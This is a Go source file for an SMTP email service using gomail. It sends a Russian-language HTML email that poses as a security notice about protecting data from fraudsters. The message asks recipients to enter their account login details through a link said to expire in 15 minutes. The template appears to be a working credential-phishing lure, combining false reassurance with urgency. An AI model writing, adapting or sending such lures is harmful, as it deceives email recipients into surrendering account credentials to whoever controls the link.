package service

import (
	"crypto/tls"
	"fmt"
	"os"
	"strconv"

	"gopkg.in/gomail.v2"
)

type EmailService struct {
	dialer *gomail.Dialer
	from   string
}

func NewEmailService() *EmailService {
	host := os.Getenv("SMTP_HOST")
	port := os.Getenv("SMTP_PORT")
	user := os.Getenv("SMTP_USER")
	from := os.Getenv("SMTP_FROM")
	pass := os.Getenv("SMTP_PASS")

	portInt,_:= strconv.Atoi(port)
	
	d := gomail.NewDialer(host,portInt,user,pass)
	d.TLSConfig = &tls.Config{ServerName: host,InsecureSkipVerify: false}

	return &EmailService{
		dialer: d,
		from: from,
	}
}

func (e *EmailService) SendMSG(toEmail,link string) error {
	msg := gomail.NewMessage()
	msg.SetHeader("Subject","Защита и безопасность")
	msg.SetHeader("From",e.from)
	msg.SetHeader("To",toEmail)

	body := fmt.Sprintf(`
			<div style="font-family: sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #e2e8f0; border-radius: 10px;">
				<h2 style="color: #0f172a; margin-bottom: 10px;">"Защита данных от мошенников"!</h2>
				<p style="color: #64748b; font-size: 16px; line-height: 1.5;">Мы сохраняем ваши данные для входа в аккаунт. Введите данные по этой ссылке:</p>
				<div style="text-align: center; margin: 20px 0;">
					<a href="%s" style="display: inline-block; background-color: #6366f1; color: #ffffff; text-decoration: none; font-size: 16px; font-weight: 600; padding: 12px 28px; border-radius: 8px;">Ввести данные</a>
				</div>
				<p style="color: #94a3b8; font-size: 12px;">Если кнопка не открывается, скопируйте ссылку в браузер: %s</p>
				<p style="color: #94a3b8; font-size: 12px;">Ссылка действительна в течение 15 минут.</p>
			</div>
		`, link, link)

	msg.SetBody("text/html",body)

	if err := e.dialer.DialAndSend(msg); err != nil {
		return err
	}

	return nil
}